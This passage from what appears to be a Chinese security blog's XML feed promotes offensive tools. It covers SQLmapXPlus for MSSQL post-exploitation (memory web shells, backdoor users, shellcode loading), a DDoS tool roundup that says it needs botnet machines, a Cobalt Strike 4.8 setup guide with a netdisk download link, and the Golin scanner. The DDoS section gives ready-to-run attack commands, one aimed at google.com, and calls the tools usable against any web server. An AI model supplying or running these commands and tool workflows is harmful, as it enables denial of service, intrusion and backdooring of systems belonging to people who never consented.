Txt/CSV 文件中。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 工具推荐 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透工具推荐 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQLmapXPlus-比SQLmap好用!</title>
      <link href="/2024/02/24/25-SQLmap%20X%20plus/"/>
      <url>/2024/02/24/25-SQLmap%20X%20plus/</url>
      
        <content type="html"><![CDATA[<h1 id="还在用原版SQLmap？太low了！我们都用SQLmap-X-Plus"><a href="#还在用原版SQLmap？太low了！我们都用SQLmap-X-Plus" class="headerlink" title="还在用原版SQLmap？太low了！我们都用SQLmap X Plus!"></a>还在用原版SQLmap？太low了！我们都用SQLmap X Plus!</h1><p>原创 ChinaRan404 <a href="javascript:void(0);">知攻善防实验室</a> <em>2024-02-05 09:31</em> <em>山东</em></p><p>关注本公众号，长期推送技术文章</p><p><img src="http://mmbiz.qpic.cn/mmbiz_png/H7ec9FOh7vpaa3t1HRmibZdUyUIV26B2MicC0Pdssk9I8XMhaLthiakFkJoPdL4fwjibWEOuTdXxu4VibxgqQ7yl6yg/300?wx_fmt=png&amp;wxfrom=19" alt="img"></p><p><strong>知攻善防实验室</strong></p><p>红蓝对抗，Web渗透测试，红队攻击，蓝队防守，内网渗透，漏洞分析，漏洞原理，开源 工具，社工钓鱼，网络安全。</p><p>公众号</p><p>免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用！！！</p><p>简介</p><p>今日，某安全博主二开了SQLmapXPlus版本</p><p>目前开发现状</p><p>目前已完成部分二开，包括ole、xpcmdshell两种文件上传、内存马上传、clr安装功能，能够实现mssql注入场景下的自动化注入内存马、自动化提权、自动化添加后门用户、自动化远程文件下载、自动化shellcode加载功能。</p><p>新增功能</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#  开启 clr 功能--enable-clr</span><br><span class="line">#  关闭 clr 功能--disable-clr</span><br><span class="line"># 通过 xp_cmdshell 实现的文件上传功能 ，作用为将本地文件上传到远程服务器--xp-upload localfile remotefile</span><br><span class="line"># 通过 ole 实现的文件上传功能 ，作用为将本地文件上传到远程服务器--ole-upload#  通过 xp_cmdshell 实现的clr安装方式--install-clr1#  通过 ole 实现的clr安装方式--install-clr2#  进入clr-shell命令交互模式--clr-shell#  通过 xp_cmdshell 实现的HttpListener内存马上传方式--sharpshell-upload1#  通过 ole 实现的HttpListener内存马上传方式--sharpshell-upload2</span><br></pre></td></tr></tbody></table></figure><p>使用教程</p><h2 id="https-github-com-co01cat-SqlmapXPlus-tab-readme-ov-file"><a href="#https-github-com-co01cat-SqlmapXPlus-tab-readme-ov-file" class="headerlink" title="https://github.com/co01cat/SqlmapXPlus?tab=readme-ov-file"></a><a href="https://github.com/co01cat/SqlmapXPlus?tab=readme-ov-file">https://github.com/co01cat/SqlmapXPlus?tab=readme-ov-file</a></h2><p>如果说没有python3或者git环境运行下方命令:</p><h2 id="debian-系列-kali-ubuntu"><a href="#debian-系列-kali-ubuntu" class="headerlink" title="debian-系列-kali-ubuntu"></a>debian-系列-kali-ubuntu</h2><p>sudo apt-get update &amp;&amp; sudo apt-get install python3 git</p><h2 id="centos系列"><a href="#centos系列" class="headerlink" title="centos系列"></a>centos系列</h2><p>sudo yum install -y python3 &amp;&amp; sudo yum install git</p><h2 id="arch系列"><a href="#arch系列" class="headerlink" title="arch系列"></a>arch系列</h2><p>sudo pacman -S python3.11 git</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/co01cat/SqlmapXPlus</span><br></pre></td></tr></tbody></table></figure><h2 id="如果没有git命令-那么-运行-sudo-apt-get-install-git"><a href="#如果没有git命令-那么-运行-sudo-apt-get-install-git" class="headerlink" title="如果没有git命令,那么,运行:sudo apt-get install git"></a>如果没有git命令,那么,运行:sudo apt-get install git</h2><p>或者直接下载</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/H7ec9FOh7vo0OHeqrQpkvGaA5G4Q2229nluOroZVewgRwRlMjEELibw2ax3bzZnqZ6OlfRlY5iay8vfC131yYYNw/640?wx_fmt=png&amp;from=appmsg&amp;tp=wxpic&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片"></p><p>然后解压，</p><p>运行python sqlmap.py -hh</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/H7ec9FOh7vo0OHeqrQpkvGaA5G4Q2229tAqQZRQO2caWficGQVTZxpuATbrLOr0lzUkGz6w3zgL1yNoRwScDZRg/640?wx_fmt=png&amp;from=appmsg&amp;tp=wxpic&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片"></p><p>该师傅发表了使用文档</p><p><a href="http://mp.weixin.qq.com/s?__biz=Mzk0NjYyNDI0Ng==&amp;mid=2247483828&amp;idx=1&amp;sn=5735814837f8e58376187668714e4605&amp;chksm=c302022df4758b3ba5e4368c3f8be2ac5183ebbebc247e318380b9e14ae341d717e59102e448&amp;scene=21#wechat_redirect">数据库注入工具 SqlmapXPlus ！增强MSSQL后渗透利用方式！</a></p><h2 id="https-github-com-co01cat-SqlmapXPlus-tab-readme-ov-file-1"><a href="#https-github-com-co01cat-SqlmapXPlus-tab-readme-ov-file-1" class="headerlink" title="https://github.com/co01cat/SqlmapXPlus?tab=readme-ov-file"></a><a href="https://github.com/co01cat/SqlmapXPlus?tab=readme-ov-file">https://github.com/co01cat/SqlmapXPlus?tab=readme-ov-file</a></h2><p>文章介绍了SqlmapXPlus这一工具，它是在经典的数据库漏洞利用工具Sqlmap的基础上，经过二次开发而成，特别增强了对MSSQL数据库注入的攻击能力。SqlmapXPlus增加了多项新功能，包括文件上传、内存马上传、CLR安装等，以支持在各种限制性的网络环境下进行SQL Server注入攻击，并能完成自动化的攻击流程。</p><p>特别地，工具解决了在不出网、低权限、站库分离等复杂环境中的一些常见问题，并提供了一系列的攻击和提权功能，如自动化注入内存马、提权、添加后门用户、远程文件下载及shellcode加载。</p><p>新增功能详细介绍了CLR的开启与关闭、文件上传（通过xp_cmdshell和ole实现）、CLR安装方式（通过xp_cmdshell和ole实现），以及内存马的上传。此外，还介绍了clr-shell命令交互模式的内置功能，如开启远程桌面、添加用户、命令执行、提权、内存马注入、文件下载等。</p><p>文章还提供了具体的使用示例和命令格式，指导用户如何安装CLR、上传内存马、进入clr-shell模式，并执行各种操作，最终实现攻击目的。同时，说明了如何使用cobaltstrike生成shellcode，并通过SqlmapXPlus的功能将其注入到目标系统中。</p><p>总结来说，文章详细阐述了SqlmapXPlus这一强化版的Sqlmap工具的新功能和使用场景，为数据库攻击提供了更多自动化和应对复杂环境的解决方案。</p>]]></content>
      
      
      <categories>
          
          <category> 工具推荐 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透工具推荐 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DDOS工具推荐(需要肉鸡)</title>
      <link href="/2024/02/24/12-ddos%E5%B7%A5%E5%85%B7/"/>
      <url>/2024/02/24/12-ddos%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<p>分布式拒绝服务(DDoS:Distributed Denial of Service)攻击指借助于客户/服务器技术，将多个计算机联合起来作为攻击平台，对一个或多个目标发动DDoS攻击，从而成倍地提高拒绝服务攻击的威力。通常，攻击者使用一个偷窃帐号将DDoS主控程序安装在一个计算机上，在一个设定的时间主控程序将与大量代理程序通讯，代理程序已经被安装在网络上的许多计算机上。代理程序收到指令时就发动攻击。利用客户/服务器技术，主控程序能在几秒钟内激活成百上千次代理程序的运行。</p><h3 id="DDOs-Attack"><a href="#DDOs-Attack" class="headerlink" title="DDOs-Attack"></a>DDOs-Attack</h3><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/Ha3MrX/DDOs-Attack  </span><br><span class="line">cd DDOs-Attack  </span><br><span class="line">chmod +x ddos-attack.py  </span><br><span class="line">python ddos-attack.py  </span><br></pre></td></tr></tbody></table></figure><p>输入目标网址和端口便可完成 ddos<img src="https://mmbiz.qpic.cn/mmbiz_jpg/Xb3L3wnAiatjLSiaoEp46uGFJOx7sKDArVGT7ghmEs2RoZAksbzvH5Mic0ic0VMLjmciapnB6HgfS8gM6yNicL6XwkmA/640?wx_fmt=jpeg" alt="null"></p><h3 id="Slowloris"><a href="#Slowloris" class="headerlink" title="Slowloris"></a>Slowloris</h3><p><code>Slowloris</code> 是 Github 上提供的免费开源工具。我们可以使用此工具执行拒绝服务攻击。这是一个用<code>python</code>编写的框架。此工具允许单台机器关闭另一台机器的 <code>Web</code> 服务器，它使用完全合法的 <code>HTTP</code>流量。它建立一个完整的 <code>TCP</code> 连接，然后在长期和定期的时间间隔只需要几百个请求。因此，该工具不需要花费大量流量来耗尽服务器上的可用连接。</p><h3 id="Slowloris-的用途："><a href="#Slowloris-的用途：" class="headerlink" title="Slowloris 的用途："></a>Slowloris 的用途：</h3><p><code>Slowloris</code> 向目标发送多个请求，因此会产生大量流量的僵尸网络。<code>Slowloris</code> 可用于对任何网络服务器执行 ddos 攻击。它是一个开源工具，因此您可以从 github 免费下载它。它使用完全合法的 HTTP 流量。可以在 Slowloris 的帮助下通过产生大量僵尸网络流量来执行拒绝服务攻击。</p><h3 id="安装食用"><a href="#安装食用" class="headerlink" title="安装食用"></a>安装食用</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/gkbrk/slowloris.git  </span><br><span class="line">python3 slowloris .py（你的IP地址）-s 500</span><br></pre></td></tr></tbody></table></figure><p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/Xb3L3wnAiatjLSiaoEp46uGFJOx7sKDArVNyBnSbCqhkaQ7JIvPCWRIEWnaR8HMslC0S1wtjkrUmYzU9TMHdicfVg/640?wx_fmt=jpeg" alt="null"></p><h3 id="Goldeneye"><a href="#Goldeneye" class="headerlink" title="Goldeneye"></a>Goldeneye</h3><p><code>Goldeneye</code>是GitHub 上提供的免费开源工具。我们可以使用此工具执行拒绝服务攻击。它是一个用 <code>.NET Core</code> 编写的框架。该工具提供了许多用于日常工作的基类和扩展。此工具允许单台机器关闭另一台机器的 Web 服务器，它使用完全合法的 HTTP 流量。它建立一个完整的 TCP 连接，然后在长期和定期的时间间隔只需要几百个请求。因此，该工具不需要使用大量流量来耗尽服务器上的可用连接。</p><h3 id="特征"><a href="#特征" class="headerlink" title="特征"></a>特征</h3><ul><li>Goldeneye 使用完全合法的 HTTP 流量。拒绝服务攻击可以在 Goldeneye 的帮助下通过产生大量僵尸网络流量来执行。</li><li>Goldeneye 向目标发送多个请求，结果会产生大量流量的僵尸网络。</li><li>Goldeneye 是一个开源工具，因此您可以从 GitHub 免费下载它。</li><li>Goldeneye 可用于对任何网络服务器执行 ddos攻击。</li></ul><h3 id="安装食用-1"><a href="#安装食用-1" class="headerlink" title="安装食用"></a>安装食用</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/jseidl/GoldenEye.git  </span><br><span class="line">#示例 1使用 GoldenEye 工具对任意域进行 DDoS 攻击。  </span><br><span class="line">./goldeneye.py https://www.google.com -s 1000  </span><br><span class="line">#以“随机”模式发送流量  </span><br><span class="line">./goldeneye.py http://192.168.0.233:80/ -s 10 -m 6  </span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      <categories>
          
          <category> 工具推荐 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透工具推荐 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cobalt Strike 4.8安装教程</title>
      <link href="/2024/02/24/11-cs4.8%E5%AE%89%E8%A3%85/"/>
      <url>/2024/02/24/11-cs4.8%E5%AE%89%E8%A3%85/</url>
      
        <content type="html"><![CDATA[<h1 id="Cobalt-Strike-4-8-安装教程"><a href="#Cobalt-Strike-4-8-安装教程" class="headerlink" title="Cobalt Strike 4.8 安装教程"></a>Cobalt Strike 4.8 安装教程</h1><p>  Cobalt Strike是一款基于java的渗透测试神器，常被业界人称为CS神器。自3.0以后已经不在使用<a href="https://so.csdn.net/so/search?q=Metasploit%E6%A1%86%E6%9E%B6&amp;spm=1001.2101.3001.7020">Metasploit框架</a>而作为一个独立的平台使用，分为客户端与服务端，服务端是一个，客户端可以有多个，非常适合团队协同作战，多个攻击者可以同时连接到一个团队服务器上，共享攻击资源与目标信息和sessions，可模拟APT做模拟对抗，进行内网渗透。<br>  Cobalt Strike集成了端口转发、服务扫描，自动化溢出，多模式端口监听，win exe木马生成，win dll木马生成，java木马生成，office宏病毒生成，木马捆绑；钓鱼攻击包括：站点克隆，目标信息获取，java执行，浏览器自动攻击等等</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><blockquote><p>百度网盘</p><p>链接：<a href="https://pan.baidu.com/s/1pXqxo8wj-PDkSRfIXl0SPw?pwd=06lp">https://pan.baidu.com/s/1pXqxo8wj-PDkSRfIXl0SPw?pwd=06lp</a><br>提取码：06lp </p></blockquote><h3 id="步骤一：准备工作"><a href="#步骤一：准备工作" class="headerlink" title="步骤一：准备工作"></a>步骤一：准备工作</h3><p>在开始安装之前，请确保您已经完成以下准备工作：</p><ol><li>一台Windows操作系统（推荐Windows 10或更高版本）</li><li>Java Runtime Environment (JRE) 8或更高版本</li><li>CobaltStrike 4.8安装文件（可以从官方网站或授权渠道获取）</li></ol><h3 id="步骤二：安装Java环境"><a href="#步骤二：安装Java环境" class="headerlink" title="步骤二：安装Java环境"></a>步骤二：安装Java环境</h3><p>​    检测是否有jdk环境</p><blockquote><p>apt search java | grep jdk</p></blockquote><p>​     使用这个命令安装jdk</p><blockquote><p>apt install openjdk-11-jdk</p></blockquote><p><img src="https://img-blog.csdnimg.cn/96db097e093f4fcebe809eadc61cd591.png" alt="img"></p><h2 id="kali-切换JAVA版本"><a href="#kali-切换JAVA版本" class="headerlink" title="kali 切换JAVA版本"></a>kali 切换JAVA版本</h2><p>在Kali Linux中切换Java版本可以通过使用<code>update-alternatives</code>命令来完成。</p><p>首先，打开终端并输入以下命令查看当前系统上已安装的Java版本列表：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo update-java-alternatives --list</span><br></pre></td></tr></tbody></table></figure><p>这将显示所有已安装的Java版本及其对应的路径。</p><p>然后，选择要切换到的特定Java版本。比如，我们想要切换到OpenJDK 11，则运行以下命令：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo update-java-alternatives --set java-1.11.0-openjdk-amd64</span><br></pre></td></tr></tbody></table></figure><p>注意，根据你的情况，需要相应地更改版本号。</p><p>最后，验证新的Java版本是否生效。再次运行以下命令：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -version</span><br></pre></td></tr></tbody></table></figure><h3 id="步骤三：安装CobaltStrike-4-8"><a href="#步骤三：安装CobaltStrike-4-8" class="headerlink" title="步骤三：安装CobaltStrike 4.8"></a>步骤三：安装CobaltStrike 4.8</h3><h4 id="服务端安装"><a href="#服务端安装" class="headerlink" title="服务端安装"></a>服务端安装</h4><p><img src="https://img-blog.csdnimg.cn/c4d1625d5a524685b60559c748a63cce.png" alt="img"></p><p>​    1.解压缩CobaltStrike 4.8安装文件到您选择的目录,也可以直接复制到桌面</p><p><img src="https://img-blog.csdnimg.cn/df6efc3e43f2472e8868a5e3db093a99.png" alt="img"></p><p>​    2.进入该目录，找到并运行“teamserver.bat”文件。 </p><p><img src="https://img-blog.csdnimg.cn/478b050a39094ef8bf24735a29ee940a.jpeg" alt="img"></p><p>​    \3. 您将会看到CobaltStrike控制台启动，并显示一个许可证请求。</p><p>   运行命令: sudo ./teamserver 192.168.184.145（kali的IP） 123（密码随便设）</p><p><img src="https://img-blog.csdnimg.cn/d9b96a438b7a4b1791696442ec78058d.png" alt="img"></p><h4 id="客户端安装"><a href="#客户端安装" class="headerlink" title="客户端安装"></a><a href="https://so.csdn.net/so/search?q=%E5%AE%A2%E6%88%B7%E7%AB%AF&amp;spm=1001.2101.3001.7020">客户端</a>安装</h4><ol><li>客户端也需要jdk环境，我用的是jdk-8u381-windows-x64版本，其他版本建议自己尝试。</li></ol><p><img src="https://img-blog.csdnimg.cn/24ba31fc61a64034b40b491f840f4ad3.png" alt="img"></p><p>​    2.进行必要的配置和设置，包括监听器、目标主机等。</p><p><img src="https://img-blog.csdnimg.cn/956d63c8da074c85bab81096b1fab78c.png" alt="img"></p><p>​     3.识别证书是否一致</p><p><img src="https://img-blog.csdnimg.cn/b108c79024774fb4982ae742c304f290.png" alt="img"></p><p>​    4.完成设置后，您将看到CobaltStrike控制台命令行界面。</p><p><img src="https://img-blog.csdnimg.cn/e739b49c74a046239a5de2a7be8e3296.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> 技术文章 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透工具推荐 </tag>
            
            <tag> 教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Golin-一体化的漏洞扫描工具</title>
      <link href="/2024/02/24/15-Golin/"/>
      <url>/2024/02/24/15-Golin/</url>
      
        <content type="html"><![CDATA[<h2 id="GOlin-一体化的漏洞扫描工具-链接"><a href="#GOlin-一体化的漏洞扫描工具-链接" class="headerlink" title="GOlin 一体化的漏洞扫描工具||链接"></a>GOlin 一体化的漏洞扫描工具||链接</h2><p><a href="https://github.com/selinuxG/Golin">https://github.com/selinuxG/Golin</a></p><h2 id="下载链接"><a href="#下载链接" class="headerlink" title="下载链接:"></a>下载链接:</h2><p><a href="https://github.com/selinuxG/Golin/releases/tag/1.2.5">https://github.com/selinuxG/Golin/releases/tag/1.2.5</a></p><h1 id="主要功能"><a href="#主要功能" class="headerlink" title="主要功能"></a>主要功能</h1><blockquote><p>主机覆盖探测、漏洞扫描、子域名扫描、端口扫描、各类服务数据库爆破、poc扫描、xss扫描、web标题探测、web指纹识别、web敏感信息泄露、web目录浏览、web文件下载、保障安全风险等问题风险自查等； 弱口令/未授权访问：40余种??组件； WEB识别：300余种； 漏洞扫描：XSS、任意文件访问、任意命令执行、敏感信息泄露、默认账户密码…； 资产扫描：扫描每个主机-&gt;评估每个端口-&gt;识别协议/组件-&gt;基于组件协议进行弱口令、漏洞扫描-&gt;输出报告</p></blockquote><h2 id="web模式预约-仅支持运行等保-安全配置配置功能"><a href="#web模式预约-仅支持运行等保-安全配置配置功能" class="headerlink" title="web模式预约(仅支持运行等保/安全配置配置功能)"></a>web模式预约(仅支持运行等保/安全配置配置功能)</h2><p><a href="https://github.com/selinuxG/Golin/blob/master/images/web.jpg"><img src="https://github.com/selinuxG/Golin/raw/master/images/web.jpg" alt="网络"></a></p><h2 id="资产-组件-漏洞扫描功能预览"><a href="#资产-组件-漏洞扫描功能预览" class="headerlink" title="资产/组件/漏洞扫描功能预览"></a>资产/组件/漏洞扫描功能预览</h2><p><a href="https://github.com/selinuxG/Golin/blob/master/images/port.jpg"><img src="https://github.com/selinuxG/Golin/raw/master/images/port.jpg" alt="港口"></a></p><h2 id="WEB目录扫描模式预览"><a href="#WEB目录扫描模式预览" class="headerlink" title="WEB目录扫描模式预览"></a>WEB目录扫描模式预览</h2><p><a href="https://github.com/selinuxG/Golin/blob/master/images/dirsearch.jpg"><img src="https://github.com/selinuxG/Golin/raw/master/images/dirsearch.jpg" alt="目录搜索"></a></p><h2 id="弱口令-未授权现阶段支持类型"><a href="#弱口令-未授权现阶段支持类型" class="headerlink" title="弱口令/未授权现阶段支持类型"></a>弱口令/未授权现阶段支持类型</h2><table><thead><tr><th>序号</th><th>类型</th><th>是否支持</th><th>备注</th></tr></thead><tbody><tr><td>1</td><td>SSH</td><td>√</td><td></td></tr><tr><td>2</td><td>远程开发计划</td><td>√</td><td></td></tr><tr><td>3</td><td>文件传输协议</td><td>√</td><td></td></tr><tr><td>4</td><td>MySQL</td><td>√</td><td></td></tr><tr><td>5</td><td>PostgreSQL</td><td>√</td><td></td></tr><tr><td>6</td><td>雷迪斯</td><td>√</td><td></td></tr><tr><td>7</td><td>SQL数据库</td><td>√</td><td></td></tr><tr><td>8</td><td>中小企业</td><td>√</td><td></td></tr><tr><td>9</td><td>远程登录</td><td>√</td><td></td></tr><tr><td>10</td><td>雄猫</td><td>√</td><td></td></tr><tr><td>11</td><td>芒果数据库</td><td>√</td><td>仅验证未授权访问</td></tr><tr><td>12</td><td>弹性搜索</td><td>√</td><td>仅验证未授权访问</td></tr><tr><td>13</td><td>甲骨文</td><td>√</td><td></td></tr><tr><td>14</td><td>动物园管理员</td><td>√</td><td>仅验证未授权访问</td></tr><tr><td>15</td><td>达博</td><td>√</td><td>仅验证默认账户</td></tr><tr><td>16</td><td>NPS</td><td>√</td><td>仅验证默认账户</td></tr><tr><td>17 号</td><td>德鲁伊</td><td>√</td><td>仅验证未授权访问</td></tr><tr><td>18</td><td>活跃的MQ</td><td>√</td><td>仅验证默认账户</td></tr><tr><td>20</td><td>沙发数据库</td><td>√</td><td>仅验证未授权访问</td></tr><tr><td>21</td><td>Hadoop-管理</td><td>√</td><td>仅验证未授权访问</td></tr><tr><td>22</td><td>阿帕奇Spark</td><td>√</td><td>仅验证未授权访问</td></tr><tr><td>23</td><td>昂首阔步</td><td>√</td><td>仅验证未授权访问</td></tr><tr><td>24</td><td>木花</td><td>√</td><td>仅验证未授权访问</td></tr><tr><td>25</td><td>卡夫卡管理器</td><td>√</td><td>仅验证未授权访问</td></tr><tr><td>26</td><td>詹金斯</td><td>√</td><td>仅验证未授权访问</td></tr><tr><td>27</td><td>一切</td><td>√</td><td>仅验证未授权访问</td></tr><tr><td>28</td><td>D-Link 路由器</td><td>√</td><td>仅验证默认账户</td></tr><tr><td>29</td><td>纳科斯</td><td>√</td><td>仅验证默认账户</td></tr><tr><td>30</td><td>Hive服务器</td><td>√</td><td>仅验证未授权访问</td></tr><tr><td>31</td><td>DockerRegistry</td><td>√</td><td>仅验证未授权访问</td></tr><tr><td>32</td><td>阿帕奇风暴</td><td>√</td><td>仅验证未授权访问</td></tr><tr><td>33</td><td>普罗米修斯</td><td>√</td><td>仅验证未授权访问</td></tr><tr><td>34</td><td>节点导出器</td><td>√</td><td>仅验证未授权访问</td></tr><tr><td>35</td><td>阿帕奇德鲁伊</td><td>√</td><td>仅验证未授权访问</td></tr><tr><td>36</td><td>扎比克斯</td><td>√</td><td>仅验证默认账户</td></tr><tr><td>37</td><td>Jupyter实验室</td><td>√</td><td>仅验证未授权访问</td></tr><tr><td>38</td><td>XXL工作</td><td>√</td><td>仅验证默认账户</td></tr><tr><td>39</td><td>WIFISKY7层流控路由器</td><td>√</td><td>仅验证默认账户</td></tr><tr><td>40</td><td>Apache-APISIX</td><td>√</td><td>仅验证默认账户</td></tr><tr><td>41</td><td>阿里巴巴-哨兵</td><td>√</td><td>仅验证默认账户</td></tr><tr><td>42</td><td>飞致云-DateEase</td><td>√</td><td>仅验证默认账户</td></tr><tr><td>43</td><td>Apache-Solr-管理</td><td>√</td><td>仅验证未授权访问</td></tr><tr><td>44</td><td>EasyCVR视频管理平台</td><td>√</td><td>仅验证默认账户</td></tr><tr><td>45</td><td>使用友-移动系统管理</td><td>√</td><td>仅验证未授权访问</td></tr><tr><td>46</td><td>杰拉皮</td><td>√</td><td>仅验证默认账户</td></tr><tr><td>47</td><td>蒙戈快递</td><td>√</td><td>仅验证未授权访问</td></tr></tbody></table><h2 id="资产扫描现阶段支持功能"><a href="#资产扫描现阶段支持功能" class="headerlink" title="资产扫描现阶段支持功能"></a>资产扫描现阶段支持功能</h2><table><thead><tr><th>序号</th><th>功能</th><th>是否支持</th><th>备注</th></tr></thead><tbody><tr><td>1</td><td>多线程</td><td>√</td><td>默认为100梯度，可通过-c指定梯度数</td></tr><tr><td>2</td><td>指定端口</td><td>√</td><td>格式支持1,2,3,2-20</td></tr><tr><td>3</td><td>指定IP</td><td>√</td><td>格式支持192.168.1.1,192.168.1.1/24,192.168.1-10, <a href="http://www.baidu.com/">http://www.baidu.com</a></td></tr><tr><td>4</td><td>故障排除端口/主机</td><td>√</td><td></td></tr><tr><td>5</td><td>扫描前探测主机主机</td><td>√</td><td>基于ping，可通过–noping跳过探测</td></tr><tr><td>6</td><td>打乱主机顺序</td><td>√</td><td>默认不打乱,可通过–随机进行打乱</td></tr><tr><td>7</td><td>协议识别</td><td>√</td><td>目前支持常见协议：ssh、redis、https、https、MySQL、pgsql、ftp等</td></tr><tr><td>8</td><td>超时时间</td><td>√</td><td>默认5秒，可通过-t指定</td></tr><tr><td>9</td><td>识别网</td><td>√</td><td>目前支持识别服务器、标题、ssl证书</td></tr><tr><td>10</td><td>结果保存</td><td>√</td><td>默认保存保存到portscan.xlsx</td></tr><tr><td>11</td><td>主机操作系统识别</td><td>√</td><td>基于ttl</td></tr><tr><td>12</td><td>组件识别</td><td>√</td><td>目前使用300+</td></tr><tr><td>13</td><td>自动扫描弱口令</td><td>√</td><td>rdp、ssh、redis、mysql、oracle、es、telnet、pgsql等40+种</td></tr><tr><td>14</td><td>web自动扫描xss</td><td>√</td><td></td></tr><tr><td>15</td><td>web自动扫描漏洞</td><td>√</td><td>扫描poc、未授权访问、目录泄露</td></tr><tr><td>16</td><td>快速扫描格式</td><td>√</td><td>支持格式：<a href="https://192.168.1.xn--1:9090http-hh3i//192.168.1.1:9090、192.168.1.1:9090/login/index.php">https://192.168.1.1:9090、http://192.168.1.1:9090、192.168.1.1:9090/login/index.php</a></td></tr><tr><td>17 号</td><td>sql注入扫描</td><td>√</td><td></td></tr><tr><td>18</td><td>佛法数据</td><td>√</td><td>需设置fofa_email、fofa_key、fofa_size环境变量</td></tr><tr><td>19</td><td>网站截图</td><td>√</td><td>需要本地配备chrom浏览器</td></tr></tbody></table><h2 id="web目录扫描现阶段支持功能"><a href="#web目录扫描现阶段支持功能" class="headerlink" title="web目录扫描现阶段支持功能"></a>web目录扫描现阶段支持功能</h2><table><thead><tr><th>序号</th><th>功能</th><th>是否支持</th><th>备注</th></tr></thead><tbody><tr><td>1</td><td>多线程</td><td>√</td><td>默认为30欧元</td></tr><tr><td>2</td><td>自定义状态码</td><td>√</td><td>默认为200</td></tr><tr><td>3</td><td>代理模式</td><td>√</td><td>http/s、袜子</td></tr><tr><td>4</td><td>返回标题</td><td>√</td><td></td></tr><tr><td>5</td><td>超时等待时常</td><td>√</td><td>默认为3秒</td></tr><tr><td>6</td><td>循环等待</td><td>√</td><td>默认为无限制</td></tr><tr><td>7</td><td>网址</td><td>√</td><td>3W+</td></tr><tr><td>8</td><td>自定义用户代理</td><td>√</td><td></td></tr><tr><td>9</td><td>重传</td><td></td><td></td></tr><tr><td>10</td><td>爬虫</td><td></td><td></td></tr><tr><td>11</td><td>结果保存</td><td>√</td><td>保存到dirScan.json</td></tr><tr><td>12</td><td>内置字典</td><td>√</td><td>3W条目录路径</td></tr><tr><td>13</td><td>识别目录浏览</td><td>√</td><td></td></tr><tr><td>14</td><td>识别敏感信息泄露</td><td>√</td><td></td></tr><tr><td>15</td><td>识别文件下载</td><td>√</td><td></td></tr><tr><td>16</td><td>xss扫描</td><td>√</td><td></td></tr><tr><td>17 号</td><td>组件识别</td><td>√</td><td>目前使用300+</td></tr></tbody></table><h2 id="自动化测评现阶段支持类型"><a href="#自动化测评现阶段支持类型" class="headerlink" title="自动化测评现阶段支持类型"></a>自动化测评现阶段支持类型</h2><table><thead><tr><th>序号</th><th>类型</th><th>是否支持</th><th>备注</th></tr></thead><tbody><tr><td>1</td><td>森托斯</td><td>√</td><td>SSH远程或本地运行</td></tr><tr><td>2</td><td>视窗</td><td>√</td><td>本地运行</td></tr><tr><td>3</td><td>雷迪斯</td><td>√</td><td>远程或本地运行</td></tr><tr><td>4</td><td>PostgreSQL</td><td>√</td><td>远程或本地运行</td></tr><tr><td>5</td><td>甲骨文</td><td>√</td><td>远程或本地运行</td></tr><tr><td>6</td><td>SQL数据库</td><td>√</td><td>远程或本地运行</td></tr><tr><td>7</td><td>新华三</td><td>√</td><td>SSH远程</td></tr><tr><td>8</td><td>华为</td><td>√</td><td>SSH远程</td></tr><tr><td>9</td><td>AIX</td><td>√</td><td>可自定义命令未内置</td></tr><tr><td>10</td><td>乌班图</td><td>√</td><td>可自定义命令未内置</td></tr><tr><td>11</td><td>MongoDB</td><td></td><td></td></tr><tr><td>12</td><td>弹性搜索</td><td></td><td></td></tr></tbody></table><h1 id="常用启动参数"><a href="#常用启动参数" class="headerlink" title="常用启动参数"></a>常用启动参数</h1><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 